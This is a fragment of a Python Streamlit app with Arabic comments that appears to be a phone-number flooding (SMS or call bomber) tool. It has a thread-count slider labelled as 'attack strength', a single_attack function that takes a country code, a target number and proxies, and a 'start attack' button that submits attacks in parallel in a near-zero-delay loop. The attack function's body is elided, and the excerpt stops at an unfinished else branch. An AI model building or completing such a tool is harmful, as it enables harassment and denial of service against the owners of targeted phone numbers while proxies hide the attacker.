...
threads_count = st.slider("☣️ قوة الهجوم (Threads):", 1, 100, 50)

# الدالة الأساسية للإرسال بدون تأخير
def single_attack(country_code, number, proxies_list):
...
if st.button("⚠️ بـدء الهجـوم"):
    if number:
        ...
        # استخدام ThreadPoolExecutor لضمان سرعة خيالية وإرسال متوازي
        with ThreadPoolExecutor(max_workers=threads_count) as executor:
            while st.session_state.running:
                # إطلاق المهام في الخلفية بسرعة وبدون توقف
                executor.submit(single_attack, country_code, number, proxies_list)
                ...
                # سرعة الرسال بدون أي تأخير (0 ثانية)
                time.sleep(0.001) 
    else:
